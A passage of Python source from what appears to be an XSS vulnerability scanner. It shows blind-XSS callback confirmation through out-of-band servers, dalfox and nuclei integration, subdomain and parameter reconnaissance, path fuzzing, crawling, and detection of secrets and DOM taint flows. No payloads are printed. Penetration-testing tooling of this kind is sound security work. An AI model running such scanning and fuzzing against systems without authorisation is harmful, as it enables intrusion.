                await self.oob.close()
            if self._status_task:
                self._status_task.cancel()
                with suppress(asyncio.CancelledError):
                    await self._status_task
                self._status_task = None
            self.stats.endpoints = len(self.endpoints)
            self.state.extra["endpoints"] = sorted(self.endpoints)[:5000]
            self.state.save(force=True)

        self.console.rule("reports & summary")
        self.print_summary()
        self.write_reports()
        self.console.event(
            "target_completed", target=self.target, findings=len(self.findings),
            stats=asdict(self.stats), browser_available=bool(self.pool and self.pool.engines),
        )

        if self.pool:
            await self.pool.stop()
            self.pool = None
        await self.http.close()
        return self.findings

    def _load_state(self) -> None:
        for raw in self.state.findings:
            try:
                finding = Finding(**{k: raw.get(k, "") for k in Finding.__dataclass_fields__})
            except Exception:
                continue
            if finding.key() in self._finding_keys:
                continue
            self.findings.append(finding)
            self._finding_keys.add(finding.key())
        self.stats.findings = len(self.findings)
        if self.state.waf:
            self.waf = WAFReport(names=list(self.state.waf))

    # -- out-of-band verification -------------------------------------------------------
    async def _start_oob(self) -> None:
        """Create the configured OOB transport (interactsh / HTTP / file)."""
        requested = (
            getattr(self.args, "interactsh", None)
            or getattr(self.args, "oob_poll", None)
            or getattr(self.args, "oob_file", None)
        )
        if not requested:
            return
        if not HAS_RECON or OOBManager is None:
            self.console.warn(
                "Out-of-band polling is unavailable: the recon/OOB modules failed to import"
            )
            return

        source = None
        server = getattr(self.args, "interactsh", None)
        poll_url = getattr(self.args, "oob_poll", None)
        oob_file = getattr(self.args, "oob_file", None)
        if server and InteractshClient is not None:
            source = InteractshClient(
                self.console,
                server=server,
                proxy=getattr(self.args, "proxy", None),
                insecure=getattr(self.args, "insecure", False),
                timeout=max(8.0, self.args.timeout),
            )
        elif oob_file and FilePoller is not None:
            source = FilePoller(self.console, oob_file, callback_base=self.blind_url or "")
        elif poll_url and CallbackPoller is not None:
            source = CallbackPoller(
                self.console,
                poll_url,
                timeout=max(5.0, self.args.timeout),
                insecure=getattr(self.args, "insecure", False),
                proxy=getattr(self.args, "proxy", None),
            )
        if source is None:
            return

        manager = OOBManager(
            self.console,
            source,
            poll_interval=max(1.0, float(getattr(self.args, "oob_interval", 5.0) or 5.0)),
        )
        if await manager.start():
            self.oob = manager
            self.state.extra["oob_transport"] = source.name
            self.console.info(f"Out-of-band transport: {source.name}", important=False)
        else:
            self.console.warn(
                f"Out-of-band transport {source.name} is unavailable; callbacks will not be confirmed"
            )

    async def _oob_loop(self) -> None:
        if self.oob is None:
            return
        interval = max(1.0, float(getattr(self.args, "oob_interval", 5.0) or 5.0))
        while not self._stop.is_set():
            try:
                await asyncio.wait_for(self._stop.wait(), timeout=interval)
                break
            except asyncio.TimeoutError:
                pass
            except asyncio.CancelledError:
                raise
            for hit in await self.oob.poll_once():
                self._confirm_oob(hit)

    def _confirm_oob(self, hit: Any) -> None:
        if self.oob is None:
            return
        registration = self.oob.registrations.get(hit.marker)
        if registration is None:
            return
        self.stats.oob_hits += 1
        self.state.extra["oob_hits"] = self.stats.oob_hits
        evidence = (
            f"out-of-band callback observed via {hit.protocol or self.oob.source.name}"
            f" from {hit.remote_address or 'unknown'}"
        )
        detail = f"marker {hit.marker}; raw: {truncate(hit.raw, 300)}"
        subkey = f"oob:{hit.marker}"
        for finding in self.findings:
            if finding.subkey != subkey:
                continue
            finding.kind = "Blind XSS (callback confirmed)"
            finding.confidence = "confirmed"
            finding.evidence = evidence
            finding.detail = detail
            finding.payload = registration.payload or finding.payload
            finding.tags = list(dict.fromkeys([*finding.tags, "oob", "confirmed"]))
            self.state.findings = [item.to_dict() for item in self.findings]
            self.state.save(force=True)
            self.console.finding(finding)
            return
        blind_point = InjectionPoint(
            url=registration.url,
            method=registration.method,
            param=registration.parameter,
        )
        blind_poc_url, blind_poc_command = self.poc_for_point(
            blind_point, registration.payload
        )
        self.add_finding(
            Finding(
                kind="Blind XSS (callback confirmed)",
                url=registration.url,
                parameter=registration.parameter,
                method=registration.method,
                payload=registration.payload,
                evidence=evidence,
                confidence="confirmed",
                context="blind",
                detail=detail,
                subkey=subkey,
                tags=["blind", "oob", "confirmed"],
                poc_url=blind_poc_url,
                poc_command=blind_poc_command,
            )
        )

    async def _drain_oob(self) -> None:
        if self.oob is None:
            return
        for hit in await self.oob.poll_once():
            self._confirm_oob(hit)
        wait = float(getattr(self.args, "oob_wait", 0.0) or 0.0)
        if wait <= 0:
            return
        interval = max(1.0, float(getattr(self.args, "oob_interval", 5.0) or 5.0))
        deadline = time.monotonic() + wait
        self.console.info(f"Waiting up to {wait:.0f}s for out-of-band callbacks", important=False)
        while time.monotonic() < deadline and not self._stop.is_set():
            await asyncio.sleep(min(interval, max(0.5, deadline - time.monotonic())))
            for hit in await self.oob.poll_once():
                self._confirm_oob(hit)
            if any(finding.kind == "Blind XSS (callback confirmed)" for finding in self.findings):
                break

    # -- external tool findings ---------------------------------------------------------
    async def _run_external_findings(self, urls: Sequence[str]) -> None:
        if not (
            getattr(self.args, "external_tools", False)
            and HAS_RECON
            and ExternalToolkit is not None
        ):
            return
        if self._stop.is_set():
            return
        toolkit = ExternalToolkit(
            self.console,
            timeout=max(60.0, self.args.timeout * 6),
            max_results=max(100, self.args.max_urls),
        )
        self.external_summary = toolkit.summary()
        self.console.info(f"External verification tools: {self.external_summary}", important=False)
        findings: List[Any] = []
        try:
            findings = await toolkit.dalfox(self.target, blind=self.blind_url or "")
        except Exception as exc:
            self.console.debug(f"dalfox failed: {exc}")
        try:
            sample = [self.target, *list(urls)[:20]]
            findings.extend(await toolkit.nuclei(sample, tags="xss"))
        except Exception as exc:
            self.console.debug(f"nuclei failed: {exc}")
        for item in findings:
            self._record_external_finding(item)

    def _record_external_finding(self, item: Any) -> None:
        self.external_findings.append(item)
        self.stats.external_findings = len(self.external_findings)
        severity = str(getattr(item, "severity", "medium") or "medium").lower()
        # Strict evidence policy: a third-party tool's claim is not proof.
        # XOXSS did not independently verify it, so it ships as confidence=low
        # with an explicit "unverified" tag; the PoC URL lets the operator
        # reproduce the claim in one click.
        confidence = "low"
        digest = hashlib.sha1(
            f"{getattr(item, 'tool', '')}|{getattr(item, 'url', '')}|"
            f"{getattr(item, 'parameter', '')}|{getattr(item, 'payload', '')[:200]}".encode(
                "utf-8", "replace"
            )
        ).hexdigest()[:10]
        self.add_finding(
            Finding(
                kind=f"XSS ({getattr(item, 'tool', 'external')} finding)",
                url=getattr(item, "url", self.target),
                parameter=getattr(item, "parameter", "") or "N/A",
                method=(getattr(item, "method", "GET") or "GET").upper(),
                payload=getattr(item, "payload", ""),
                evidence=getattr(item, "evidence", ""),
                confidence=confidence,
                context="external",
                detail=f"Reported by {getattr(item, 'tool', 'external tool')}"
                + (
                    f" (template {getattr(item, 'template', '')})"
                    if getattr(item, "template", "")
                    else ""
                )
                + " - NOT independently confirmed by XOXSS; reproduce via the PoC URL",
                subkey=f"external:{getattr(item, 'tool', 'tool')}:{digest}",
                tags=[getattr(item, "tool", "external"), "external", severity, "unverified"],
                poc_url=str(getattr(item, "url", "") or ""),
            )
        )

    async def _status_loop(self) -> None:
        last = self.stats.requests
        tick = 0
        rps = 0
        spin = 0
        while not self._stop.is_set():
            await asyncio.sleep(0.25)
            tick += 1
            if tick % 4 == 0:
                rps = self.stats.requests - last
                last = self.stats.requests
            spin = (spin + 1) % 10
            self.console.set_status(self._render_status(rps, spin))

    def _render_status(self, rps: int, spin: int) -> str:
        s = self.stats
        dim = bcolors.DIM
        label = bcolors.GREY
        bold = bcolors.BOLD
        if _ui is not None and _ui.enabled():
            spinner = _ui.paint(_ui.SPINNER[spin % len(_ui.SPINNER)], _ui.BRAND_BRIGHT)
            sep = _ui.paint("|", bcolors.GREY)
        else:
            spinner = ""
            sep = "|"
        findings_word = "findings "
        findings_val = len(self.findings)
        findings_part = (
            f"{bcolors.FAIL}{bcolors.BOLD}{findings_word}{findings_val}{bcolors.ENDC}"
            if findings_val
            else f"{label}{findings_word}{findings_val}{bcolors.ENDC}"
        )
        return (
            f"{spinner} {dim}[ {bcolors.ENDC}"
            f"{label}rps{bcolors.ENDC} {bold}{rps:>3}{bcolors.ENDC} {dim}{sep}{bcolors.ENDC} "
            f"{label}req{bcolors.ENDC} {bold}{s.requests:>6}{bcolors.ENDC} {dim}{sep}{bcolors.ENDC} "
            f"{label}urls{bcolors.ENDC} {bold}{s.urls_done}/{s.urls_total}{bcolors.ENDC} {dim}{sep}{bcolors.ENDC} "
            f"{label}points{bcolors.ENDC} {bold}{s.points}{bcolors.ENDC} {dim}{sep}{bcolors.ENDC} "
            f"{label}payloads{bcolors.ENDC} {bold}{s.payloads}{bcolors.ENDC} {dim}{sep}{bcolors.ENDC} "
            f"{findings_part} "
            f"{dim}]{bcolors.ENDC}"
        )

    # -- discovery --------------------------------------------------------------------
    async def prepare_urls(self) -> List[str]:
        recon = await self.recon_seeds()
        if not self.args.crawl:
            combined = list(dict.fromkeys([self.target, *recon]))
            return combined[: max(1, self.args.max_urls)]
        self.console.info(
            f"Crawling {self.target} (depth {self.args.crawl_depth}, max {self.args.max_urls})"
        )
        # Recon seeds first so a tight --max-urls budget still covers the
        # passive/JS/OpenAPI surface the operator explicitly asked for.
        seeds = [*recon, *(await self.discover_seeds())]
        urls = await self.crawl(seeds)
        if self.target not in urls:
            urls.insert(0, self.target)
        self.state.extra["endpoints"] = sorted(self.endpoints)[:5000]
        self.console.ok(
            f"Crawl complete: {len(urls)} URL(s), {len(self.endpoints)} endpoint(s)",
            important=False,
        )
        return urls

    async def recon_seeds(self) -> List[str]:
        """Run optional passive/active reconnaissance and return extra URLs."""
        if not HAS_RECON:
            return []
        subdomain_mode = bool(getattr(self.args, "subdomains", False)) or int(
            getattr(self.args, "subdomain_brute", 0) or 0
        ) > 0
        passive_mode = bool(getattr(self.args, "passive_urls", False))
        openapi_mode = bool(getattr(self.args, "openapi", False))
        fuzz_mode = bool(getattr(self.args, "fuzz_paths", False))
        mine_mode = bool(getattr(self.args, "mine_params", False))
        external_mode = bool(getattr(self.args, "external_tools", False))
        if not (subdomain_mode or passive_mode or openapi_mode or fuzz_mode or mine_mode or external_mode):
            return []

        parts = urlsplit(self.target)
        host = parts.hostname or ""
        domain = root_domain(host) if root_domain else host
        scheme = parts.scheme or "https"
        extra: List[str] = []

        if subdomain_mode and SubdomainFinder is not None:
            try:
                finder = SubdomainFinder(
                    self.http,
                    self.console,
                    timeout=max(8.0, self.args.timeout),
                    limit=max(100, self.args.max_urls * 2),
                )
                report = await finder.enumerate(
                    domain, brute_limit=max(0, int(getattr(self.args, "subdomain_brute", 0) or 0))
                )
                self.subdomains = list(report.resolved)
                self.stats.subdomains = len(self.subdomains)
                self.state.extra["subdomains"] = self.subdomains[:5000]
                extra.extend(
                    urlunsplit((scheme, sub, "/", "", "")) for sub in self.subdomains
                )
                for error in report.errors[:5]:
                    self.console.debug(f"Subdomain source error: {error}")
            except Exception as exc:
                self.console.warn(f"Subdomain enumeration failed: {exc}")

        if passive_mode and PassiveURLCollector is not None:
            try:
                collector = PassiveURLCollector(
                    self.http,
                    self.console,
                    timeout=max(10.0, self.args.timeout),
                    limit=max(100, self.args.max_urls * 3),
                )
                report = await collector.collect(
                    domain, scope_filter=self.scope.in_scope
                )
                self.passive_urls = list(report.urls)
                self.stats.passive_urls = len(self.passive_urls)
                self.stats.discovered_params = max(
                    self.stats.discovered_params, len(report.parameters)
                )
                self.state.extra["passive_urls"] = self.passive_urls[:5000]
                self.state.extra["passive_parameters"] = report.parameters[:2000]
                extra.extend(self.passive_urls)
                for error in report.errors[:5]:
                    self.console.debug(f"Passive URL source error: {error}")
            except Exception as exc:
                self.console.warn(f"Passive URL collection failed: {exc}")

        if openapi_mode and OpenAPIFinder is not None:
            try:
                finder = OpenAPIFinder(
                    self.http, self.console, timeout=max(5.0, self.args.timeout)
                )
                operations = await finder.discover(self.target)
                self.api_operations = list(operations)
                self.state.extra["openapi_operations"] = [
                    operation.to_dict() for operation in operations[:500]
                ]
                extra.extend(operation.url for operation in operations)
                if operations:
                    self.console.info(
                        f"OpenAPI: {len(operations)} operation(s) discovered", important=False
                    )
            except Exception as exc:
                self.console.warn(f"OpenAPI discovery failed: {exc}")

        if fuzz_mode and DirFuzzer is not None:
            try:
                fuzzer = DirFuzzer(
                    self.http,
                    self.console,
                    extensions=("",),
                    concurrency=min(10, max(1, self.args.concurrency)),
                    limit=min(500, max(50, self.args.max_urls)),
                    timeout=max(5.0, self.args.timeout),
                )
                fuzz_results = await fuzzer.discover(self.target)
                self.stats.fuzzed_paths = len(fuzz_results)
                for fuzz_result in fuzz_results:
                    extra.append(fuzz_result.url)
                    self._record_endpoint(fuzz_result.url, "fuzz")
            except Exception as exc:
                self.console.warn(f"Path fuzzing failed: {exc}")

        if mine_mode and ParameterMiner is not None:
            try:
                miner = ParameterMiner(
                    self.http,
                    self.console,
                    marker=unique_token("p", 6),
                    concurrency=min(8, max(1, self.args.concurrency)),
                    timeout=max(5.0, self.args.timeout),
                )
                names = list(PARAM_WORDS)[
                    : max(1, int(getattr(self.args, "fuzz_param_limit", 10)) * 4)
                ]
                discovered = await miner.mine([self.target], names)
                self.stats.discovered_params = max(
                    self.stats.discovered_params, len(discovered)
                )
                for item in discovered:
                    self._mined_params.setdefault(item.url, []).append(item.name)
                    separator = "&" if "?" in item.url else "?"
                    extra.append(f"{item.url}{separator}{item.name}=1")
            except Exception as exc:
                self.console.warn(f"Parameter mining failed: {exc}")

        if external_mode and ExternalToolkit is not None:
            try:
                toolkit = ExternalToolkit(
                    self.console,
                    timeout=max(30.0, self.args.timeout * 6),
                    max_results=max(100, self.args.max_urls * 2),
                )
                self.external_summary = toolkit.summary()
                self.console.info(
                    f"External recon tools: {self.external_summary}", important=False
                )
                hosts = await toolkit.subdomains(domain)
                if hosts:
                    live = await toolkit.live_hosts(hosts)
                    discovered_hosts = live or [
                        urlunsplit((scheme, hostname, "/", "", "")) for hostname in hosts
                    ]
                    for url in discovered_hosts:
                        hostname = urlsplit(url).hostname or ""
                        if hostname and hostname not in self.subdomains:
                            self.subdomains.append(hostname)
                    self.stats.subdomains = len(self.subdomains)
                    self.state.extra["subdomains"] = self.subdomains[:5000]
                    extra.extend(discovered_hosts)
                urls = await toolkit.urls(domain)
                extra.extend(urls)
                crawl = await toolkit.crawl(
                    self.target, depth=min(3, max(1, self.args.crawl_depth))
                )
                extra.extend(crawl.urls)
                parameter_targets = list(dict.fromkeys(
                    [self.target, *(url for url in self.passive_urls if self.scope.in_scope(url))]
                ))[:20]
                discovered_parameters = await toolkit.parameters(parameter_targets)
                external_parameter_state: Dict[str, List[str]] = {}
                for endpoint, names in discovered_parameters.items():
                    if not self.scope.in_scope(endpoint):
                        continue
                    if HAS_PARAM_AUDIT and ParameterHarvester is not None:
                        parameter_report = ParameterHarvester(
                            self.http, self.console, limit=max(1, self.args.max_urls)
                        ).from_names(endpoint, names, source="arjun/x8")
                        names = [candidate.name for candidate in parameter_report.candidates]
                    self._mined_params.setdefault(endpoint, []).extend(names)
                    self._mined_params[endpoint] = list(dict.fromkeys(self._mined_params[endpoint]))
                    for name in names:
                        if name not in self.discovered_param_names:
                            self.discovered_param_names.append(name)
                    external_parameter_state[endpoint] = names
                    extra.append(endpoint)
                if external_parameter_state:
                    self.stats.discovered_params += sum(
                        len(names) for names in external_parameter_state.values()
                    )
                    self.state.extra["external_parameters"] = external_parameter_state
                    self.console.info(
                        f"External parameter discovery: "
                        f"{sum(len(names) for names in external_parameter_state.values())} name(s) "
                        f"across {len(external_parameter_state)} endpoint(s)",
                        important=False,
                    )
                self.state.extra["external_tools"] = self.external_summary
            except Exception as exc:
                self.console.warn(f"External recon failed: {exc}")

        result: List[str] = []
        seen: Set[str] = set()
        for url in extra:
            if not url or not self.scope.in_scope(url) or looks_like_dangerous(url):
                continue
            try:
                normalized = normalize_url(url)
            except ValueError:
                continue
            if not normalized or normalized in seen:
                continue
            seen.add(normalized)
            result.append(url)
            self._record_endpoint(url, "recon")
        if result:
            self.console.info(
                f"Reconnaissance added {len(result)} URL(s)", important=False
            )
        return result[: max(1, self.args.max_urls)]

    async def discover_seeds(self) -> List[str]:
        """Collect extra crawl seeds from robots.txt, sitemaps and common paths."""
        seeds: List[str] = []
        parts = urlsplit(self.target)
        origin = urlunsplit((parts.scheme, parts.netloc, "", "", ""))

        if getattr(self.args, "discover", True):
            sitemap_urls: List[str] = []
            robots = await self.http.get(urljoin(origin, "/robots.txt"), cache=True)
            if robots.ok and robots.text:
                for line in robots.text.splitlines():
                    key, _, value = line.partition(":")
                    key = key.strip().lower()
                    value = value.strip()
                    if not value:
                        continue
                    if key == "sitemap":
                        sitemap_urls.append(value)
                    elif key in ("allow", "disallow"):
                        # Wildcard and root-only rules are not concrete endpoints.
                        if value != "/" and "*" not in value and "$" not in value:
                            seeds.append(urljoin(origin, value))
            sitemap_urls.append(urljoin(origin, "/sitemap.xml"))
            seeds.extend(await self.parse_sitemaps(sitemap_urls))
            if seeds:
                self.console.debug(f"Seed discovery produced {len(seeds)} candidate(s)")

        if getattr(self.args, "discover_paths", False):
            seeds.extend(await self.probe_common_endpoints(origin))

        result: List[str] = []
        seen: Set[str] = set()
        for url in seeds:
            if not url or not self.scope.in_scope(url) or looks_like_dangerous(url):
                continue
            if not looks_like_scan_target(url, fuzz_params=True):
                continue
            normalized = normalize_url(url)
            if normalized in seen:
                continue
            seen.add(normalized)
            result.append(url)
            self._record_endpoint(url, "seed")
        return result

    async def parse_sitemaps(
        self,
        urls: Sequence[str],
        max_sitemaps: int = 10,
        max_urls: int = 2000,
    ) -> List[str]:
        found: List[str] = []
        queue: List[str] = [url for url in dict.fromkeys(urls) if url]
        visited: Set[str] = set()
        while queue and len(visited) < max_sitemaps and len(found) < max_urls:
            sitemap_url = queue.pop(0)
            if sitemap_url in visited:
                continue
            visited.add(sitemap_url)
            response = await self.http.get(sitemap_url, cache=True)
            if response.error or not response.text:
                continue
            text = response.text[:2_000_000]
            locations = [
                html_lib.unescape(loc.strip())
                for loc in re.findall(r"<loc>\s*([^<\s]+)\s*</loc>", text, re.I)
            ]
            locations = [urljoin(sitemap_url, location) for location in locations]
            if "<sitemapindex" in text.lower():
                for location in locations:
                    if location.lower().endswith(".gz"):
                        continue
                    if location not in visited:
                        queue.append(location)
            else:
                for location in locations:
                    found.append(location)
                    if len(found) >= max_urls:
                        break
        return found

    async def probe_common_endpoints(self, origin: str) -> List[str]:
        paths: List[str] = list(COMMON_ENDPOINTS)
        wordlist = getattr(self.args, "endpoint_wordlist", None)
        if wordlist:
            try:
                with open(wordlist, "r", encoding="utf-8-sig", errors="replace") as handle:
                    for line in handle:
                        entry = line.strip()
                        if entry and not entry.startswith("#"):
                            paths.append(entry if entry.startswith("/") else "/" + entry)
            except OSError as exc:
                self.console.warn(f"Cannot read endpoint wordlist {wordlist}: {exc}")

        targets: List[str] = []
        seen: Set[str] = set()
        for path in paths:
            candidate = urljoin(origin, path)
            if candidate not in seen:
                seen.add(candidate)
                targets.append(candidate)

        self.console.info(f"Probing {len(targets)} common endpoint path(s)")
        semaphore = asyncio.Semaphore(max(1, min(10, self.args.concurrency)))

        async def probe(candidate: str) -> Optional[str]:
            async with semaphore:
                response = await self.http.get(candidate, allow_redirects=False, cache=True)
                if response.error:
                    return None
                if response.status in (200, 201, 204, 301, 302, 303, 307, 308, 401, 403, 405):
                    return response.url or candidate
                return None

        results = await asyncio.gather(*(probe(candidate) for candidate in targets), return_exceptions=True)
        found: List[str] = []
        for item in results:
            if isinstance(item, str):
                found.append(item)
                self._record_endpoint(item, "wordlist")
        if found:
            self.console.debug(f"Common-path probing found {len(found)} endpoint(s)")
        return found

    def _record_endpoint(self, url: str, source: str = "crawl") -> None:
        try:
            normalized = normalize_url(url)
        except ValueError:
            return
        if not self.scope.in_scope(normalized) or looks_like_dangerous(normalized):
            return
        if not looks_like_scan_target(normalized, fuzz_params=True):
            return
        if normalized in self.endpoints:
            return
        self.endpoints.add(normalized)
        self.stats.endpoints = len(self.endpoints)
        self.console.debug(f"Endpoint [{source}]: {truncate(normalized, 130)}")

    async def _crawl_page(self, url: str, depth: int) -> List[str]:
        response = await self.http.get(url, cache=True)
        if response.error or not response.text:
            return []
        text = response.text[:3_000_000]
        content_type = response.header("content-type", "").lower()
        links: List[str] = []
        is_html = "html" in content_type or text.lstrip().startswith("<")
        if is_html and HAS_BS4:
            soup = _soup(text)
            links.extend(self._links_from_soup(soup, url))
            if HAS_RECON and extract_attr_urls is not None:
                links.extend(extract_attr_urls(text, url))
            if HAS_RECON and extract_html_parameters is not None:
                discovered = self._mined_params.setdefault(url, [])
                for name in extract_html_parameters(text):
                    if name not in discovered:
                        discovered.append(name)
            
            # Check script tags for vulnerable libraries
            scripts = extract_scripts(url, text)
            if getattr(self.args, "check_libs", True):
                for script in scripts:
                    if not script.inline:
                        vulns = check_vulnerable_libs(script.url)
                        for vuln in vulns:
                            if vuln not in self.vulnerable_libs:
                                self.vulnerable_libs.append(vuln)
                                self.console.warn(
                                    f"Vulnerable library: {vuln.name} {vuln.version} ({vuln.severity}) - {vuln.cve} @ {truncate(vuln.url, 80)}"
                                )
            
            links.extend(await self._endpoints_from_scripts(scripts, url))
        else:
            links.extend(extract_endpoints_from_text(text, url))
        # Follow .js files that were reached through links (not only <script src>).
        for link in list(links):
            path = urlsplit(link).path.lower()
            if path.endswith((".js", ".mjs")) and self.scope.in_scope(link):
                links.extend(await self._endpoints_from_js_file(link))
        for link in links:
            self._record_endpoint(link, "crawl")
        self.console.debug(f"Crawled {truncate(url, 120)} (depth {depth})")
        return links

    def _links_from_soup(self, soup: Any, page_url: str) -> List[str]:
        links: List[str] = []
        for tag in soup.find_all(["a", "area", "link"], href=True):
            href = tag.get("href")
            if isinstance(href, str):
                links.append(urljoin(page_url, href))
        for tag in soup.find_all(["iframe", "frame"], src=True):
            src = tag.get("src")
            if isinstance(src, str):
                links.append(urljoin(page_url, src))
        for tag in soup.find_all("form", action=True):
            action = tag.get("action")
            if isinstance(action, str):
                links.append(urljoin(page_url, action))
        for tag in soup.find_all("object", data=True):
            data = tag.get("data")
            if isinstance(data, str):
                links.append(urljoin(page_url, data))
        for tag in soup.find_all("meta", attrs={"http-equiv": True}):
            if str(tag.get("http-equiv", "")).lower() == "refresh":
                match = re.search(r"url\s*=\s*['\"]?([^'\"\s;]+)", str(tag.get("content", "")), re.I)
                if match:
                    links.append(urljoin(page_url, match.group(1)))
        return links

    async def _endpoints_from_scripts(self, scripts: Sequence[DomScript], page_url: str) -> List[str]:
        endpoints: List[str] = []
        for script in scripts:
            if script.inline:
                endpoints.extend(extract_endpoints_from_text(script.content, page_url))
            else:
                endpoints.extend(await self._endpoints_from_js_file(script.url))
        return endpoints

    async def _endpoints_from_js_file(self, url: str) -> List[str]:
        max_files = max(0, int(getattr(self.args, "js_files", 25)))
        if url in self._js_seen or self._js_files_fetched >= max_files:
            return []
        self._js_seen.add(url)
        self._js_files_fetched += 1
        response = await self.http.get(url, cache=True)
        if response.error or not response.text or len(response.text) > 2_000_000:
            return []
        
        # Check for vulnerable JavaScript libraries
        if getattr(self.args, "check_libs", True):
            vulns = check_vulnerable_libs(url, response.text)
            for vuln in vulns:
                if vuln not in self.vulnerable_libs:
                    self.vulnerable_libs.append(vuln)
                    self.console.warn(
                        f"Vulnerable library: {vuln.name} {vuln.version} ({vuln.severity}) - {vuln.cve} @ {truncate(vuln.url, 80)}"
                    )
        
        # Advanced: Mutation XSS detection
        if HAS_ADVANCED and getattr(self.args, 'mxss', False):
            await self._detect_mxss(url, response.text)
        
        # Advanced: Prototype pollution detection
        if HAS_ADVANCED and getattr(self.args, 'proto_pollution', False):
            await self._detect_proto_pollution(url, response.text)

        self.stats.js_files += 1
        intel = None
        if HAS_RECON and analyze_javascript_intel is not None:
            try:
                intel = analyze_javascript_intel(
                    response.text, url, source=url, include_dom=True
                )
            except Exception as exc:
                self.console.debug(f"JS intelligence failed for {url}: {exc}")
        if intel is None:
            return extract_endpoints_from_text(response.text, url)

        self.js_intel.append(intel)
        self.stats.secrets += len(intel.secrets)
        self.stats.ast_flows += len(intel.dom_flows)
        for secret in intel.secrets:
            self._record_secret(url, secret)
        for flow in intel.dom_flows:
            self._record_taint_flow(url, flow)
        if intel.parameters:
            for name in intel.parameters:
                if name not in self.discovered_param_names:
                    self.discovered_param_names.append(name)
            self.stats.discovered_params = max(
                self.stats.discovered_params, len(self.discovered_param_names)
            )
        return [*intel.endpoints, *intel.chunks]

    def _record_secret(self, url: str, secret: Any) -> None:
        severity = str(getattr(secret, "severity", "medium") or "medium").lower()
        confidence = "high" if severity in ("critical", "high") else "medium"
        digest = hashlib.sha1(
            str(getattr(secret, "value", "")).encode("utf-8", "replace")
        ).hexdigest()[:10]
        self.add_finding(
            Finding(
                kind="JavaScript secret exposure",
                url=url,
                parameter=getattr(secret, "kind", "secret"),
                method="GET",
                payload=getattr(secret, "masked", lambda: "")(),
                evidence=(
                    f"{getattr(secret, 'kind', 'secret')} ({severity}) at line "
                    f"{getattr(secret, 'line', 0)}: {getattr(secret, 'context', '')}"
                ),
                confidence=confidence,
                context="js",
                detail="Credential-like value in a client-side bundle; verify it is live and scoped.",
                subkey=f"secret:{getattr(secret, 'kind', 'secret')}:{digest}",
                tags=["secret", severity],
            )
        )

    def _record_taint_flow(self, url: str, flow: Any) -> None:
        key = (
            f"{getattr(flow, 'source', '')}|{getattr(flow, 'sink', '')}|"
            f"{getattr(flow, 'line', 0)}|{getattr(flow, 'snippet', '')[:120]}"
        )
        if key in self._ast_seen:
            return
        self._ast_seen.add(key)
        sanitized = bool(getattr(flow, "sanitized", False))
        if sanitized and not getattr(self.args, "report_reflections", False):
            return
        if sum(1 for finding in self.findings if "ast" in finding.tags) >= 50:
            return
        score = float(getattr(flow, "confidence", 0.7) or 0.0)
        confidence = "low" if sanitized else ("high" if score >= 0.85 else "medium")
        digest = hashlib.sha1(key.encode("utf-8", "replace")).hexdigest()[:10]
        path = ", ".join(getattr(flow, "path", []) or []) or "direct"
        self.add_finding(
            Finding(
                kind="DOM XSS (taint flow)",
                url=url,
                parameter=getattr(flow, "source", "source"),
                method="GET",
                payload=getattr(flow, "snippet", ""),
                evidence=(
                    f"{getattr(flow, 'source', 'source')} -> "
                    f"{getattr(flow, 'sink', 'sink')} ({getattr(flow, 'context', 'dom')})"
                ),
                confidence=confidence,
                context="dom",
                detail=(
                    f"line {getattr(flow, 'line', 0)}; path {path}; score {score:.2f}"
                    + (
                        f"; sanitizer {getattr(flow, 'sanitizer', '')}"
                        if getattr(flow, "sanitizer", "")
                        else ""
                    )
                ),
                subkey=f"ast:{getattr(flow, 'line', 0)}:{getattr(flow, 'sink', '')}:{digest}",
                tags=["dom", "ast"],
            )
        )

    async def crawl(self, seeds: Optional[Sequence[str]] = None) -> List[str]:
        limit = max(1, self.args.max_urls)
        depth_limit = max(1, self.args.crawl_depth)
        seen: Set[str] = set()
        ordered: List[str] = []
        frontier: List[str] = []

        for candidate in [self.target, *(seeds or [])]:
            if len(ordered) >= limit or self._stop.is_set():
                break
            if not candidate or not self.scope.in_scope(candidate) or looks_like_dangerous(candidate):
                continue
            if not looks_like_scan_target(candidate, fuzz_params=True):
                continue
            normalized = normalize_url(candidate)
            if normalized in seen:
                continue
            seen.add(normalized)
            ordered.append(candidate)
            frontier.append(candidate)
            self._record_endpoint(candidate, "seed")

        for depth in range(depth_limit):
            if not frontier or len(ordered) >= limit or self._stop.is_set():
                break
            results = await asyncio.gather(
                *(self._crawl_page(url, depth) for url in frontier),
                return_exceptions=True,
            )
            next_frontier: List[str] = []
            for result in results:
                if isinstance(result, BaseException) or not result:
                    continue
                for link in result:
                    if len(ordered) >= limit or self._stop.is_set():
                        break
                    link = link.split("#", 1)[0]
                    if not link or link.startswith(("mailto:", "tel:", "javascript:", "data:")):
                        continue
                    if not self.scope.in_scope(link) or looks_like_dangerous(link):
                        continue
                    if not looks_like_scan_target(
                        link, fuzz_params=bool(getattr(self.args, "fuzz_params", False))
                    ):
                        continue
                    normalized = normalize_url(link)
                    if normalized in seen:
                        continue
                    seen.add(normalized)
                    ordered.append(link)
                    next_frontier.append(link)
                    self._record_endpoint(link, "crawl")
            frontier = next_frontier
            self.state.extra["discovered"] = ordered[:limit]
            self.console.debug(
                f"Crawl depth {depth + 1}/{depth_limit}: {len(ordered)} URL(s), "
                f"{len(self.endpoints)} endpoint(s)"
            )
        return ordered

    async def _scan_urls(self, urls: Sequence[str]) -> None:
        semaphore = asyncio.Semaphore(max(1, self.args.threads))

        async def worker(url: str) -> None:
            async with semaphore:
                await self.scan_url(url)

        await asyncio.gather(*(worker(url) for url in urls), return_exceptions=True)

    async def scan_url(self, url: str) -> None:
        if self._stop.is_set():
            return
        if self.state.is_scanned(url) and not self.args.no_resume:
            self.console.debug(f"Skipping (already scanned): {url}")
            self.stats.urls_done += 1
            return

        self.console.info(f"Scanning {url}")
        try:
            # Advanced: JSONP detection
            if HAS_ADVANCED and getattr(self.args, 'jsonp', False):
                await self._test_jsonp(url)
            
            # Advanced: CSP analysis (also runs the Trusted Types audit)
            if HAS_ADVANCED and getattr(self.args, 'csp_analyze', False):
                await self._analyze_csp(url)

            # Advanced: CORS analysis
            if HAS_ADVANCED and getattr(self.args, 'cors_analyze', False):
                await self._analyze_cors(url)
            
            # Advanced: GraphQL endpoint detection (uses the cached page when possible)
            if HAS_ADVANCED and getattr(self.args, 'graphql', False):
                cached = self.http.peek(url) or await self.http.get(url, cache=True)
                if not cached.error and cached.text:
                    self._analyze_graphql(url, cached.text, cached.header("content-type", ""))

            if HAS_ADVANCED and getattr(self.args, "proto_pollution", False):
                await self.test_proto_pollution(url)

            points = await self.discover_points(url)
            self.console.debug(f"{len(points)} injection point(s) on {url}")
            for point in points:
